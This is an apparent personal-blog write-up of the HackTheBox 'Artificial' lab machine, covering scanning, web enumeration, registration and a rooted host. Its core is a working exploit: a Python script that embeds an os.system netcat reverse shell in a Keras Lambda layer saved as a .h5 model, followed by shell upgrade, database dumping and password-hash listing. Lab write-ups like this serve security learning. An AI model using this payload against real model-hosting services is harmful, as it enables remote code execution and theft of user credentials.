<!DOCTYPE html>
<html lang="en-us">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>HackTheBox: Artificial | 0xD3f3c7</title>
    <meta name="viewport" content="width=device-width,minimum-scale=1">
    <meta name="description" content="HackTheBox Artificial writeup">
    <link rel="stylesheet" href="/0xD3f3c7-Blog/ananke/css/main.min.d05fb5f317fcf33b3a52936399bdf6f47dc776516e1692e412ec7d76f4a5faa2.css">
    
    <style>
        /* Center content like Notion */
        body {
            background-color: #f7f7f7;
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        main {
            max-width: 900px; /* narrow, Notion-like width */
            margin: 0 auto; /* center horizontally */
            padding: 2rem 1rem;
            background: #ffffff;
            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
        }
        h1, h2, h3, h4 {
            margin-top: 2rem;
        }
        pre {
            background: #272822;
            color: #f8f8f2;
            padding: 1rem;
            overflow-x: auto;
            border-radius: 5px;
        }
        code {
            font-family: monospace;
        }
        img {
            max-width: 100%;
            display: block;
            margin: 1rem 0;
        }
        a {
            color: #1a73e8;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

<header>
    <div style="background: #000; padding: 1rem;">
        <a href="/0xD3f3c7-Blog/" style="color: white; font-size: 1.5rem; text-decoration: none;">0xD3f3c7</a>
    </div>
</header>

<main>
    <article>
        <h1>HackTheBox: Artificial</h1>
        <time datetime="2025-09-02T08:17:12-04:00">September 2, 2025</time>

        <h2>Port Scan</h2>
        <pre><code>rustscan -a 10.10.11.74 -- -A | tee rustscan.log
Open 10.10.11.74:22
Open 10.10.11.74:80</code></pre>

        <h2>Identify Target and Add to Hosts File</h2>
        <p>URL: <a href="http://10.10.11.74">http://10.10.11.74</a></p>
        <p>Upon visiting the IP in a browser, we are redirected to:</p>
        <pre><code>http://artificial.htb</code></pre>
        <p>Add this domain to <code>/etc/hosts</code>:</p>
        <pre><code>sudo nano /etc/hosts
10.10.11.74 artificial.htb</code></pre>

        <h2>Web Enumeration</h2>
        <ul>
            <li>Login and registration pages:</li>
        </ul>
        <p><a href="http://artificial.htb/login">/login</a></p>
        <p><a href="http://artificial.htb/register">/register</a></p>
        <blockquote>Artificial is a platform that lets you easily build, test, and deploy AI models to solve real-world problems like sales forecasting.</blockquote>

        <h2>Directory Scan Using ffuf</h2>
        <pre><code>ffuf -u http://artificial.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt</code></pre>
        <pre><code>/login        [Status: 200]
/register     [Status: 200]
/logout       [Status: 302]
/dashboard    [Status: 302]</code></pre>

        <h2>Registration</h2>
        <p>Register a new user at <code>/register</code>:</p>
        <img src="artificialregister.png" alt="Register page">

        <h2>Login</h2>
        <p>Login using the credentials at <code>/login</code>:</p>
        <img src="artificiallogin.png" alt="Login page">

        <h2>Exploit: Malicious .h5 Upload</h2>
        <pre><code>import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.93 6666 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")</code></pre>
        <p>Upload <code>exploit.h5</code>:</p>
        <img src="artificialuploadmodel.png" alt="Upload model">

        <h2>Listener</h2>
        <pre><code>nc -lvnp 6666</code></pre>

        <h2>Trigger Shell</h2>
        <p>Click on view predictions:</p>
        <img src="viewpredicitons.png" alt="View predictions">
        <pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'
[Ctrl+Z]
stty raw -echo; fg
export TERM=xterm</code></pre>

        <h2>Enumerate .db files</h2>
        <pre><code>find / -name "*.db*" 2>/dev/null
sqlite3 /home/app/app/instance/users.db</code></pre>
        <p>Tables:</p>
        <pre><code>.tables
SELECT * FROM user;</code></pre>
        <p>Example:</p>
        <pre><code>1|gael|gael@artificial.htb|HASH
6|whoameye|whoameye@gmail.com|5f4dcc3b5aa765d61d8327deb882cf99</code></pre>

        <h2>Login as Gael</h2>
        <pre><code>su - gael
cat ~/user.txt</code></pre>

        <h2>Confirm container</h2>
        <pre><code>hostname
cat /etc/hosts
find / -name container 2>/dev/null</code></pre>

        <h2>Host Enumeration</h2>
        <ul>
            <li>Search for backups</li>
            <li>Exfiltrate backup</li>
            <li>Analyze <code>backrest</code> files</li>
            <li>Crack passwords</li>
        </ul>

        <h2>Privilege Escalation</h2>
        <ul>
            <li>Add repo and run backup</li>
            <li>Dump snapshot files</li>
            <li>Root obtained</li>
        </ul>
        <img src="fcde9198-a3ae-4ca9-a6cf-29a22afc115d.png" alt="Root obtained">

        <p>That wraps up my first HackTheBox writeup.</p>
        <p>Hope you learned something new!</p>
        <p>Happy hacking, 0xD3f3c7</p>
    </article>
</main>

<footer style="background: #000; color: #fff; padding: 1rem; text-align: center;">
    &copy; 0xD3f3c7 2025
</footer>

</body>
</html>
